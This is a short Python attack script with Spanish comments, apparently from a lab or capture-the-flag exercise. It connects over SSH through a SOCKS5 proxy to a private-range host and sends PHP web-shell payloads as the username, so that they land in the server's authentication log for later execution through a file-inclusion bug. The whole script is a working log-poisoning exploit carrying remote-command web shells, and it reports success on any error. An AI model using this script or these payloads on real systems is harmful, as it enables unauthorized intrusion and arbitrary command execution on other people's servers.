```
#!/usr/bin/env python3

import paramiko

import socks

import socket

  

def create_proxy_socket(host, port):

"""Crear socket a través de proxy SOCKS"""

sock = socks.socksocket()

sock.set_proxy(socks.SOCKS5, "127.0.0.1", 1080)

sock.connect((host, port))

return sock

  

def ssh_poison(target, payload):

try:

# Crear socket a través del proxy

sock = create_proxy_socket(target, 22)

client = paramiko.SSHClient()

client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

print(f"[+] Inyectando: {payload}")

client.connect(

target,

username=payload,

password='test',

sock=sock,

timeout=10,

look_for_keys=False

)

except Exception as e:

print(f"[+] Inyección exitosa: {e}")

finally:

try:

client.close()

except:

pass

  

if __name__ == "__main__":

target = "10.10.0.129"

payloads = [

'<?php system($_GET["cmd"]); ?>',

'<?=`$_GET[0]`?>'

]

for payload in payloads:

ssh_poison(target, payload)
```